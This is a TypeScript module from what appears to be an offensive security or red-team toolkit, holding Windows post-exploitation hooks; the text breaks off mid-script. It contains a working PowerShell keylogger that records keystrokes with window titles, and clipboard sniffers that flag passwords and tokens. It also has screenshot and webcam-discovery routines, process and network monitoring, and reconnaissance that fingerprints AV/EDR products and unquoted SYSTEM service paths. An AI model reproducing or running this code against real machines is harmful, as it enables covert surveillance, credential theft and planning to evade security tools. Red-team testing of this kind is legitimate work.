import { ps, cmd, wmic, vbs, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function keylogWin(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting Windows keylogger for ${duration}s...\n`]

  if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
    output.push("[!] Keylogging requires Win32 API (GetAsyncKeyState) — not available via cmd.exe")
    output.push("[*] Alternatives:")
    output.push("    1. Use --exec ps (PowerShell with Add-Type P/Invoke)")
    output.push("    2. Use --exec vbs (VBScript with SendKeys monitoring — limited)")
    output.push("    3. Deploy a compiled keylogger binary and use winhook process_inject")
    output.push("    4. Use winhook credential_prompt for targeted credential phishing")
    return { output: output.join("\n"), findings }
  }

  const script = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
public class KeyLog {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
'@ -ReferencedAssemblies System.Windows.Forms
$log = @()
$end = (Get-Date).AddSeconds(${duration})
$lastWindow = ""
while ((Get-Date) -lt $end) {
    $hwnd = [KeyLog]::GetForegroundWindow()
    $sb = New-Object System.Text.StringBuilder(256)
    [KeyLog]::GetWindowText($hwnd, $sb, 256) | Out-Null
    $window = $sb.ToString()
    if ($window -ne $lastWindow -and $window) {
        $log += "[Window: $window]"
        $lastWindow = $window
    }
    for ($i = 8; $i -le 190; $i++) {
        $state = [KeyLog]::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            $key = [System.Windows.Forms.Keys]$i
            $log += $key.ToString()
        }
    }
    Start-Sleep -Milliseconds 10
}
$log -join " "
`
  const keylog = await ps(script, Math.max(timeout, duration + 10))
  if (keylog.exitCode === 0 && keylog.stdout.trim()) {
    output.push(`[+] Keystrokes captured:\n${keylog.stdout.trim()}`)
    findings.push({
      checkId: "WIN-KEYLOG-001",
      provider: "windows",
      severity: "critical",
      status: "CAPTURED",
      resource: "windows://keylogger",
      title: `Keystrokes captured over ${duration}s`,
      details: `Captured keystrokes with window context using GetAsyncKeyState`,
      remediation: "Review captured data, force password reset if credentials observed",
    })
  }
  if (keylog.exitCode !== 0) {
    output.push(`[!] Keylogger failed: ${keylog.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function etwProcess(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Monitoring process creation for ${duration}s...\n`]

  if (activeExec === "cmd" || activeExec === "bat") {
    const baseline = await cmd("tasklist /v /fo csv", timeout)
    output.push(`[*] Baseline snapshot captured (cmd.exe tasklist)`)
    const baselineLines = new Set(
      baseline.stdout
        .trim()
        .split("\n")
        .map((l) => l.split(",")[0]),
    )
    await new Promise((r) => setTimeout(r, Math.min(duration, 15) * 1000))
    const current = await cmd("tasklist /v /fo csv", timeout)
    const currentLines = current.stdout.trim().split("\n")
    const newProcs = currentLines.filter((l) => !baselineLines.has(l.split(",")[0]))
    output.push(`[+] New processes detected: ${newProcs.length}`)
    output.push("    PID | Name | Session | Memory | Status | User | Window")
    output.push("    " + "-".repeat(70))
    for (const line of newProcs.slice(0, 50)) {
      output.push(`    ${line}`)
    }
    findings.push({
      checkId: "WIN-ETW-PROC-001",
      provider: "windows",
      severity: "info",
      status: "CAPTURED",
      resource: "windows://cmd/tasklist",
      title: `Process diff: ${newProcs.length} new processes in ${duration}s`,
      details: `cmd.exe tasklist polling — baseline vs current snapshot`,
      remediation: "Review for security tool executions",
    })
    return { output: output.join("\n"), findings }
  }

  if (activeExec === "wmic") {
    const baseline = await wmic("process get ProcessId,ParentProcessId,Name,CommandLine /format:csv", timeout)
    output.push("[*] Baseline snapshot captured (wmic)")
    const baselinePids = new Set(
      baseline.stdout
        .trim()
        .split("\n")
        .map((l) => l.split(",")[1]),
    )
    await new Promise((r) => setTimeout(r, Math.min(duration, 15) * 1000))
    const current = await wmic("process get ProcessId,ParentProcessId,Name,CommandLine /format:csv", timeout)
    const newProcs = current.stdout
      .trim()
      .split("\n")
      .filter((l) => !baselinePids.has(l.split(",")[1]))
    output.push(`[+] New processes (wmic): ${newProcs.length}`)
    for (const line of newProcs.slice(0, 50)) output.push(`    ${line}`)
    findings.push({
      checkId: "WIN-ETW-PROC-001",
      provider: "windows",
      severity: "info",
      status: "CAPTURED",
      resource: "windows://wmic/process",
      title: `Process diff: ${newProcs.length} new processes in ${duration}s`,
      details: `wmic process polling — baseline vs current`,
      remediation: "Review for security tool executions",
    })
    return { output: output.join("\n"), findings }
  }

  const script = `
$events = @()
$watcher = Register-WmiEvent -Query "SELECT * FROM Win32_ProcessStartTrace" -Action {
    $e = $Event.SourceEventArgs.NewEvent
    $global:events += "$($e.ProcessID)|$($e.ParentProcessID)|$($e.ProcessName)|$(Get-Date -Format 'HH:mm:ss')"
}
Start-Sleep -Seconds ${duration}
Unregister-Event -SourceIdentifier $watcher.Name
$global:events | ForEach-Object { Write-Output $_ }
`
  const monitor = await ps(script, Math.max(timeout, duration + 15))
  if (monitor.exitCode === 0 && monitor.stdout.trim()) {
    const lines = monitor.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Process creation events: ${lines.length}`)
    output.push("    PID | PPID | Name | Time")
    output.push("    " + "─".repeat(50))
    for (const line of lines.slice(0, 100)) {
      const parts = line.split("|")
      output.push(`    ${parts[0]?.padEnd(8)} ${parts[1]?.padEnd(8)} ${parts[2]?.padEnd(30)} ${parts[3] || ""}`)
    }
    findings.push({
      checkId: "WIN-ETW-PROC-001",
      provider: "windows",
      severity: "info",
      status: "CAPTURED",
      resource: "windows://etw/process",
      title: `Process trace: ${lines.length} events in ${duration}s`,
      details: `Captured ${lines.length} process creation events via WMI`,
      remediation: "Review for security tool executions",
    })
  }
  if (monitor.exitCode !== 0) {
    output.push("[!] WMI process trace failed, falling back to tasklist polling...")
    const baseline = await ps("Get-Process | Select-Object Id, ProcessName | ConvertTo-Json", timeout)
    await new Promise((r) => setTimeout(r, Math.min(duration, 10) * 1000))
    const current = await ps("Get-Process | Select-Object Id, ProcessName | ConvertTo-Json", timeout)
    output.push("[+] Process snapshot comparison completed")
    output.push(`    Baseline: ${baseline.stdout.length} bytes`)
    output.push(`    Current: ${current.stdout.length} bytes`)
  }

  return { output: output.join("\n"), findings }
}

export async function etwNetwork(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Monitoring network connections for ${duration}s...\n`]

  if (activeExec === "cmd" || activeExec === "bat") {
    const baseline = await cmd("netstat -ano", timeout)
    if (baseline.exitCode === 0) {
      const lines = baseline.stdout
        .trim()
        .split("\n")
        .filter((l) => l.includes("ESTABLISHED") || l.includes("LISTENING"))
      const established = lines.filter((l) => l.includes("ESTABLISHED"))
      const listening = lines.filter((l) => l.includes("LISTENING"))
      output.push(`[+] Active TCP connections (cmd.exe netstat):`)
      output.push(`[+] Established: ${established.length}`)
      for (const l of established.slice(0, 50)) output.push(`    ${l.trim()}`)
      output.push(`\n[+] Listening: ${listening.length}`)
      for (const l of listening.slice(0, 30)) output.push(`    ${l.trim()}`)
    }
    if (duration > 0) {
      output.push(`\n[*] Polling for new connections over ${Math.min(duration, 15)}s...`)
      await new Promise((r) => setTimeout(r, Math.min(duration, 15) * 1000))
      const after = await cmd("netstat -ano", timeout)
      if (after.exitCode === 0) output.push("[+] Post-monitoring netstat snapshot captured")
    }
    output.push("\n[*] Additional cmd.exe network recon:")
    const arp = await cmd("arp -a", timeout)
    if (arp.exitCode === 0) {
      output.push("\n=== ARP Table ===")
      output.push(arp.stdout.trim().split("\n").slice(0, 30).join("\n"))
    }
    const dns = await cmd("ipconfig /displaydns", timeout)
    if (dns.exitCode === 0) {
      const dnsEntries = dns.stdout.match(/Record Name.*: .+/g) || []
      output.push(`\n=== DNS Cache (${dnsEntries.length} entries) ===`)
      for (const e of dnsEntries.slice(0, 20)) output.push(`    ${e.trim()}`)
    }
    const shares = await cmd("net share", timeout)
    if (shares.exitCode === 0) {
      output.push("\n=== Network Shares ===")
      output.push(shares.stdout.trim())
    }
    findings.push({
      checkId: "WIN-NET-001",
      provider: "windows",
      severity: "info",
      status: "CAPTURED",
      resource: "windows://cmd/netstat",
      title: "Network connections via cmd.exe netstat",
      details: `TCP connection monitoring over ${duration}s with ARP/DNS/shares`,
      remediation: "Review for C2, lateral movement, or data exfiltration channels",
    })
    return { output: output.join("\n"), findings }
  }

  if (activeExec === "wmic") {
    const r = await wmic(
      "nicconfig where IPEnabled=true get IPAddress,MACAddress,DefaultIPGateway,DNSServerSearchOrder /format:list",
      timeout,
    )
    output.push("=== Network Interfaces (wmic) ===")
    output.push(r.stdout.trim())
    const netstat = await cmd("netstat -ano", timeout)
    output.push("\n=== Active Connections (netstat) ===")
    output.push(netstat.stdout.trim().split("\n").slice(0, 50).join("\n"))
    findings.push({
      checkId: "WIN-NET-001",
      provider: "windows",
      severity: "info",
      status: "CAPTURED",
      resource: "windows://wmic/network",
      title: "Network enumeration via wmic + netstat",
      details: "Interface config via wmic, connections via netstat",
      remediation: "Review for C2 channels",
    })
    return { output: output.join("\n"), findings }
  }

  const baseline = await ps(
    "Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess | ConvertTo-Json",
    timeout,
  )
  if (baseline.exitCode === 0) {
    let conns: Array<Record<string, string | number>> = []
    try { conns = JSON.parse(baseline.stdout || "[]") } catch { /* PS output may be mangled */ }
    const arr = Array.isArray(conns) ? conns : [conns]
    output.push(`[+] Current TCP connections: ${arr.length}`)
    const established = arr.filter((c) => c.State === "Established" || c.State === 4)
    output.push(`[+] Established: ${established.length}`)
    for (const c of established.slice(0, 50)) {
      output.push(`    ${c.LocalAddress}:${c.LocalPort} → ${c.RemoteAddress}:${c.RemotePort} (PID: ${c.OwningProcess})`)
    }
    const listening = arr.filter((c) => c.State === "Listen" || c.State === 2)
    output.push(`\n[+] Listening: ${listening.length}`)
    for (const c of listening.slice(0, 30)) {
      output.push(`    ${c.LocalAddress}:${c.LocalPort} (PID: ${c.OwningProcess})`)
    }
  }

  if (duration > 0) {
    output.push(`\n[*] Polling for new connections over ${Math.min(duration, 30)}s...`)
    await new Promise((r) => setTimeout(r, Math.min(duration, 10) * 1000))
    const after = await ps(
      "Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' } | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | ConvertTo-Json",
      timeout,
    )
    if (after.exitCode === 0) {
      output.push("[+] Post-monitoring snapshot captured")
    }
  }

  findings.push({
    checkId: "WIN-NET-001",
    provider: "windows",
    severity: "info",
    status: "CAPTURED",
    resource: "windows://network",
    title: `Network connections enumerated`,
    details: `TCP connection snapshot captured over ${duration}s`,
    remediation: "Review for C2, lateral movement, or data exfiltration channels",
  })

  return { output: output.join("\n"), findings }
}

export async function clipboardSniff(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const interval = parseInt(argVal(args, "--interval") || "2")
  const findings: Finding[] = []
  const output: string[] = [`[*] Monitoring clipboard for ${duration}s (interval: ${interval}s)...\n`]

  if (activeExec === "vbs" || activeExec === "mshta") {
    const vbsScript = `
Dim oHTML : Set oHTML = CreateObject("htmlfile")
Dim last : last = ""
Dim endTime : endTime = DateAdd("s", ${duration}, Now)
Do While Now < endTime
  Dim clip : clip = oHTML.parentWindow.clipboardData.getData("text")
  If clip <> "" And clip <> last Then
    WScript.Echo Now & "|" & clip
    last = clip
  End If
  WScript.Sleep ${interval * 1000}
Loop
Set oHTML = Nothing
`
    const r = await vbs(vbsScript, Math.max(timeout, duration + 10))
    if (r.stdout.trim()) {
      const entries = r.stdout.trim().split("\n").filter(Boolean)
      output.push(`[+] Clipboard changes captured (VBScript): ${entries.length}`)
      for (const entry of entries) {
        const content = entry.substring(entry.indexOf("|") + 1).substring(0, 200)
        const sensitive = /password|token|key|secret|bearer|api[_-]?key|authorization/i.test(content)
        output.push(`    ${sensitive ? "[!!! SENSITIVE] " : ""}${content}`)
        if (sensitive)
          findings.push({
            checkId: `WIN-CLIP-${findings.length + 1}`,
            provider: "windows",
            severity: "critical",
            status: "CAPTURED",
            resource: "windows://clipboard",
            title: "Sensitive data from clipboard (VBScript)",
            details: `Content matches sensitive patterns`,
            remediation: "Rotate any credentials that were copied",
          })
      }
    }
    if (!r.stdout.trim()) output.push("[*] No clipboard changes detected (VBScript monitor)")
    return { output: output.join("\n"), findings }
  }

  if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
    output.push("[!] Clipboard monitoring requires PowerShell or VBScript")
    output.push("[*] cmd.exe has no native clipboard read capability")
    output.push("[*] Workaround: Use --exec vbs for VBScript-based clipboard capture")
    output.push("[*] Alternative: powershell -c Get-Clipboard (if PS accessible but restricted)")
    const clipOnce = await cmd("powershell.exe -NoProfile -Command Get-Clipboard 2>nul", timeout)
    if (clipOnce.exitCode === 0 && clipOnce.stdout.trim()) {
      output.push(`\n[+] Current clipboard content (one-shot via PS): ${clipOnce.stdout.trim().substring(0, 200)}`)
    }
    return { output: output.join("\n"), findings }
  }

  const script = `
$captured = @()
$end = (Get-Date).AddSeconds(${duration})
$last = ""
while ((Get-Date) -lt $end) {
    $clip = Get-Clipboard -ErrorAction SilentlyContinue
    if ($clip -and $clip -ne $last) {
        $ts = Get-Date -Format 'HH:mm:ss'
        $captured += "$ts|$clip"
        $last = $clip
    }
    Start-Sleep -Seconds ${interval}
}
$captured | ForEach-Object { Write-Output $_ }
`
  const sniff = await ps(script, Math.max(timeout, duration + 10))
  if (sniff.exitCode === 0 && sniff.stdout.trim()) {
    const entries = sniff.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Clipboard changes captured: ${entries.length}`)
    for (const entry of entries) {
      const parts = entry.split("|")
      const ts = parts[0]
      const content = parts.slice(1).join("|").substring(0, 200)
      const sensitive = /password|token|key|secret|bearer|api[_-]?key|authorization/i.test(content)
      output.push(`    [${ts}]${sensitive ? " [!!! SENSITIVE]" : ""} ${content}`)
      if (sensitive) {
        findings.push({
          checkId: `WIN-CLIP-${findings.length + 1}`,
          provider: "windows",
          severity: "critical",
          status: "CAPTURED",
          resource: "windows://clipboard",
          title: "Sensitive data captured from clipboard",
          details: `Timestamp: ${ts}, content matches sensitive patterns`,
          remediation: "Rotate any credentials that were copied to clipboard",
        })
      }
    }
  }
  if (!sniff.stdout.trim()) {
    output.push("[*] No clipboard changes detected during monitoring period")
  }

  return { output: output.join("\n"), findings }
}

export async function screenshotGrab(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "screen"
  const outputPath = argVal(args, "--output") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-capture-${Date.now()}`
  const findings: Finding[] = []
  const output: string[] = ["[*] Visual capture operations...\n"]

  if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
    output.push("[!] Screenshot capture requires GDI+ (.NET) — not available via cmd.exe")
    output.push("[*] Alternatives:")
    output.push("    1. Use --exec ps (PowerShell with System.Drawing)")
    output.push('    2. Use nircmd.exe: nircmd savescreenshot "screenshot.png"')
    output.push("    3. Use Snippingtool.exe /clip (Windows 10+)")
    output.push("    4. Use mshta with HTML5 Canvas (limited, no multi-monitor)")
    if (action === "webcam" || action === "all") {
      const devicesCmd = await cmd(
        "wmic path Win32_PnPEntity where \"PNPClass='Camera' or PNPClass='Image'\" get Name,Status /format:list",
        timeout,
      )
      if (devicesCmd.exitCode === 0 && devicesCmd.stdout.trim()) {
        output.push("\n=== Webcam Devices (wmic) ===")
        output.push(devicesCmd.stdout.trim())
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "screen" || action === "all") {
    const script = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Write-Output "=== Screenshot Capture ==="

$screens = [System.Windows.Forms.Screen]::AllScreens
Write-Output "[*] Monitors detected: $($screens.Count)"

$index = 0
foreach ($screen in $screens) {
    $bounds = $screen.Bounds
    Write-Output "[*] Monitor $index : $($bounds.Width)x$($bounds.Height) at ($($bounds.X),$($bounds.Y)) $(if ($screen.Primary) { '(PRIMARY)' })"

    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

    $filePath = "${outputPath}-monitor$index.png"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    $fileSize = (Get-Item $filePath).Length
    Write-Output "[+] Saved: $filePath ($([math]::Round($fileSize/1KB, 1)) KB)"

    $graphics.Dispose()
    $bitmap.Dispose()
    $index++
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CAPTURE-001",
      provider: "windows",
      severity: "medium",
      status: "EXECUTED",
      resource: "display://screenshot",
      title: "Screenshots captured from all monitors",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor for GDI+ screen capture API calls. Restrict unnecessary access to graphical sessions.",
    })
  }

  if (action === "window" || action === "all") {
    const script = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class WinCapture {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);

    [StructLayout(LayoutKind.Sequential)]
    public struct RECT {
        public int Left, Top, Right, Bottom;
    }
}
"@

Write-Output "=== Active Window Capture ==="

$hwnd = [WinCapture]::GetForegroundWindow()
$title = New-Object System.Text.StringBuilder 256
[WinCapture]::GetWindowText($hwnd, $title, 256) | Out-Null

$rect = New-Object WinCapture+RECT
[WinCapture]::GetWindowRect($hwnd, [ref]$rect) | Out-Null

$width = $rect.Right - $rect.Left
$height = $rect.Bottom - $rect.Top

Write-Output "[*] Active window: $($title.ToString())"
Write-Output "[*] Size: $($width)x$($height)"

$bitmap = New-Object System.Drawing.Bitmap($width, $height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($rect.Left, $rect.Top, 0, 0, (New-Object System.Drawing.Size($width, $height)))

$filePath = "${outputPath}-window.png"
$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
Write-Output "[+] Saved: $filePath ($([math]::Round((Get-Item $filePath).Length/1KB, 1)) KB)"

$graphics.Dispose()
$bitmap.Dispose()
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CAPTURE-002",
      provider: "windows",
      severity: "medium",
      status: "EXECUTED",
      resource: "display://active-window",
      title: "Active window screenshot captured",
      details: r.stdout.substring(0, 500),
      remediation: "Monitor for unusual screen capture API usage. DLP solutions can detect screenshot operations.",
    })
  }

  if (action === "webcam" || action === "all") {
    const script = `
Write-Output "=== Webcam Detection ==="

$devices = Get-WmiObject Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' -or $_.PNPClass -eq 'Image' -or $_.Name -match 'cam|video|webcam' }

if ($devices) {
    Write-Output "[*] Camera devices found:"
    foreach ($d in $devices) {
        Write-Output "    $($d.Name) — $($d.Status)"
    }
    Write-Output ""
    Write-Output "[*] Webcam capture requires ffmpeg or DirectShow COM interop"
    Write-Output "[*] Install ffmpeg and use: ffmpeg -f dshow -i video='DEVICE_NAME' -frames:v 1 webcam.jpg"
} else {
    Write-Output "[-] No camera devices detected"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CAPTURE-003",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "device://webcam",
      title: "Webcam device detection",
      details: r.stdout.substring(0, 500),
      remediation: "Disable unused camera devices. Monitor camera access via device auditing.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function localRecon(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "full"
  const findings: Finding[] = []
  const output: string[] = ["[*] Local environment reconnaissance...\n"]

  if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
    if (action === "av" || action === "full") {
      output.push("=== AV/EDR Detection (cmd.exe) ===\n")
      const tl = await cmd("tasklist /svc /fo csv", timeout)
      const avProcs = [
        { proc: "MsMpEng", name: "Windows Defender", type: "AV", risk: "MEDIUM" },
        { proc: "MsSense", name: "Defender for Endpoint (EDR)", type: "EDR", risk: "HIGH" },
        { proc: "CSFalconService", name: "CrowdStrike Falcon", type: "EDR", risk: "CRITICAL" },
        { proc: "SentinelAgent", name: "SentinelOne", type: "EDR", risk: "CRITICAL" },
        { proc: "CbDefense", name: "Carbon Black", type: "EDR", risk: "HIGH" },
        { proc: "SophosMcsAgent", name: "Sophos Central", type: "EDR", risk: "HIGH" },
        { proc: "CylanceSvc", name: "Cylance", type: "AI-AV", risk: "HIGH" },
        { proc: "TmListen", name: "Trend Micro", type: "EDR", risk: "HIGH" },
        { proc: "ekrn", name: "ESET NOD32", type: "AV", risk: "MEDIUM" },
        { proc: "mfetp", name: "McAfee/Trellix", type: "EDR", risk: "HIGH" },
        { proc: "ccSvcHst", name: "Symantec/Broadcom", type: "AV", risk: "MEDIUM" },
        { proc: "CortexXDR", name: "Palo Alto Cortex XDR", type: "EDR", risk: "CRITICAL" },
        { proc: "splunkd", name: "Splunk Forwarder", type: "SIEM", risk: "MEDIUM" },
        { proc: "winlogbeat", name: "Elastic Winlogbeat", type: "SIEM", risk: "MEDIUM" },
      ]
      const detected = avProcs.filter((av) => tl.stdout.includes(av.proc))
      if (detected.length > 0) {
        output.push(`[!] DETECTED SECURITY PRODUCTS (${detected.length}):`)
        for (const d of detected) output.push(`    [${d.risk}] ${d.name} (${d.type})`)
      }
      if (detected.length === 0) output.push("[+] No known AV/EDR products detected in tasklist")
      const scDefender = await cmd("sc query WinDefend", timeout)
      if (scDefender.stdout.includes("RUNNING")) output.push("[*] Windows Defender service: RUNNING")
      const fwStatus = await cmd("netsh advfirewall show allprofiles state", timeout)
      if (fwStatus.exitCode === 0) {
        output.push("\n=== Firewall Profiles ===")
        output.push(fwStatus.stdout.trim())
      }
      findings.push({
        checkId: "WIN-RECON-001",
        provider: "windows",
        severity: "info",
        status: "ENUMERATED",
        resource: "host://av-edr",
        title: "AV/EDR detection via cmd.exe tasklist + sc",
        details: `${detected.length} security products detected`,
        remediation: "Ensure EDR agents are tamper-protected.",
      })
    }

    if (action === "software" || action === "full") {
      output.push("\n=== Installed Software (cmd.exe) ===")
      const reg = await cmd(
        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /v DisplayName 2>nul',
        timeout,
      )
      const names = (reg.stdout.match(/DisplayName\s+REG_SZ\s+(.+)/g) || []).map((m) =>
        m.replace(/DisplayName\s+REG_SZ\s+/, "").trim(),
      )
      output.push(`[*] Installed applications: ${names.length}`)
      const interesting = [
        "Python",
        "Git",
        "Visual Studio",
        "Node",
        "Java",
        "Docker",
        "VPN",
        "Remote",
        "TeamViewer",
        "AnyDesk",
        "PuTTY",
        "WinSCP",
        "KeePass",
        "OpenSSH",
        "Chrome",
        "Firefox",
        "Wireshark",
        "Nmap",
      ]
      const found = names.filter((n) => interesting.some((i) => n.toLowerCase().includes(i.toLowerCase())))
      if (found.length > 0) {
        output.push("[!] Interesting software:")
        for (const f of found) output.push(`    ${f}`)
      }
      const ver = await cmd(
        "powershell.exe -NoProfile -Command $PSVersionTable.PSVersion.ToString() 2>nul || echo N/A",
        timeout,
      )
      output.push(`[*] PowerShell version: ${ver.stdout.trim() || "N/A"}`)
      findings.push({
        checkId: "WIN-RECON-002",
        provider: "windows",
        severity: "info",
        status: "ENUMERATED",
        resource: "host://software",
        title: "Software inventory via registry query",
        details: `${names.length} apps found, ${found.length} interesting. Review application names and versions in the output — for any with a version, check CVE database via cve-mcp (cve search_by_product --product <name> --version <ver>). If cve-mcp is not enabled: cyberstrike mcp enable cve`,
        remediation: "Remove unnecessary software. Update vulnerable versions.",
      })
    }

    if (action === "services" || action === "full") {
      output.push("\n=== Running Services (cmd.exe) ===")
      if (activeExec === "wmic") {
        const svc = await wmic(
          "service where state='Running' get Name,DisplayName,StartName,PathName /format:csv",
          timeout,
        )
        output.push(svc.stdout.trim().split("\n").slice(0, 40).join("\n"))
        const unquoted = svc.stdout.split("\n").filter((l) => {
          const parts = l.split(",")
          const path = parts[3] || ""
          return path && !path.startsWith('"') && path.includes(" ") && (parts[2] || "").includes("LocalSystem")
        })
        if (unquoted.length > 0) {
          output.push(`\n[!] Unquoted service paths running as SYSTEM: ${unquoted.length}`)
          for (const u of unquoted) output.push(`    ${u}`)
        }
      } else {
        const sc = await cmd("sc query state= all", timeout)
        const running = (sc.stdout.match(/SERVICE_NAME: .+/g) || []).length
        output.push(`[*] Total services queried`)
        const netStart = await cmd("net start", timeout)
        output.push(netStart.stdout.trim().split("\n").slice(0, 30).join("\n"))
      }
      findings.push({
        checkId: "WIN-RECON-003",
        provider: "windows",
        severity: "info",
        status: "ENUMERATED",
        resource: "host://services",
        title: "Service enumeration via cmd.exe",
        details:
          "Running services enumerated. Review service names and versions — for any with a version, check CVE database via cve-mcp (cve search_by_product --product <name> --version <ver>). If cve-mcp is not enabled: cyberstrike mcp enable cve",
        remediation: "Quote all service binary paths. Update vulnerable service versions.",
      })
    }

    if (action === "network" || action === "full") {
      output.push("\n=== Network (cmd.exe) ===")
      const ipconfig = await cmd("ipconfig /all", timeout)
      output.push(ipconfig.stdout.trim().split("\n").slice(0, 30).join("\n"))
      const netstat = await cmd("netstat -ano", timeout)
      const established = netstat.stdout.split("\n").filter((l) => l.includes("ESTABLISHED"))
      const listening = netstat.stdout.split("\n").filter((l) => l.includes("LISTENING"))
      output.push(`\n[+] Established connections: ${established.length}`)
      for (const l of established.slice(0, 20)) output.push(`    ${l.trim()}`)
      output.push(`\n[+] Listening ports: ${listening.length}`)
      for (const l of listening.slice(0, 20)) output.push(`    ${l.trim()}`)
      const arp = await cmd("arp -a", timeout)
      output.push("\n=== ARP Table ===")
      output.push(arp.stdout.trim().split("\n").slice(0, 15).join("\n"))
      const route = await cmd("route print", timeout)
      output.push("\n=== Routing Table ===")
      output.push(route.stdout.trim().split("\n").slice(0, 15).join("\n"))
      const shares = await cmd("net share", timeout)
      output.push("\n=== Shares ===")
      output.push(shares.stdout.trim())
      findings.push({
        checkId: "WIN-RECON-004",
        provider: "windows",
        severity: "info",
        status: "ENUMERATED",
        resource: "host://network",
        title: "Network recon via cmd.exe native commands",
        details: "ipconfig, netstat, arp, route, net share",
        remediation: "Close unnecessary ports.",
      })
    }

    if (action === "hotfixes" || action === "full") {
      output.push("\n=== Hotfixes & OS Info (cmd.exe) ===")
      if (activeExec === "wmic") {
        const qfe = await wmic("qfe list brief /format:csv", timeout)
        const lines = qfe.stdout.trim().split("\n").filter(Boolean)
        output.push(`[*] Hotfixes installed: ${lines.length - 1}`)
        for (const l of lines.slice(0, 15)) output.push(`    ${l}`)
        const os = await wmic("os get Caption,Version,BuildNumber,OSArchitecture,LastBootUpTime /format:list", timeout)
        output.push("\n=== OS Info ===")
        output.push(os.stdout.trim())
      } else {
        const sysinfo = await cmd("systeminfo", timeout)
        const hotfixes = sysinfo.stdout.match(/KB\d+/g) || []
        output.push(`[*] Hotfixes found: ${hotfixes.length}`)
        for (const kb of hotfixes.slice(0, 15)) output.push(`    ${kb}`)
        const osLine = sysinfo.stdout.split("\n").find((l) => l.includes("OS Name"))
        if (osLine) output.push(`\n[*] ${osLine.trim()}`)
        const buildLine = sysinfo.stdout.split("\n").find((l) => l.includes("OS Version"))
        if (buildLine) output.push(`[*] ${buildLine.trim()}`)
      }
      findings.push({
        checkId: "WIN-RECON-005",
        provider: "windows",
        severity: "info",
        status: "ENUMERATED",
        resource: "host://hotfixes",
        title: "Patch level assessment via cmd.exe",
        details:
          "OS version and installed hotfixes enumerated. Review OS build number and missing KBs — check CVE database via cve-mcp (cve search_by_product --product windows --version <build>) for known exploits. If cve-mcp is not enabled: cyberstrike mcp enable cve",
        remediation: "Keep systems patched. Apply missing security updates.",
      })
    }

    return { output: output.join("\n"), findings }
  }

  if (action === "av" || action === "full") {
    const script = `
Write-Output "=== AV/EDR Product Detection ==="
Write-Output ""

$avProducts = @{
    'MsMpEng' = @{ Name = 'Windows Defender'; Type = 'AV'; Risk = 'MEDIUM' }
    'MsSense' = @{ Name = 'Microsoft Defender for Endpoint (EDR)'; Type = 'EDR'; Risk = 'HIGH' }
    'CSFalconService' = @{ Name = 'CrowdStrike Falcon'; Type = 'EDR'; Risk = 'CRITICAL' }
    'CSFalconContainer' = @{ Name = 'CrowdStrike Falcon (Container)'; Type = 'EDR'; Risk = 'CRITICAL' }
    'SentinelAgent' = @{ Name = 'SentinelOne'; Type = 'EDR'; Risk = 'CRITICAL' }
    'SentinelHelperService' = @{ Name = 'SentinelOne Helper'; Type = 'EDR'; Risk = 'CRITICAL' }
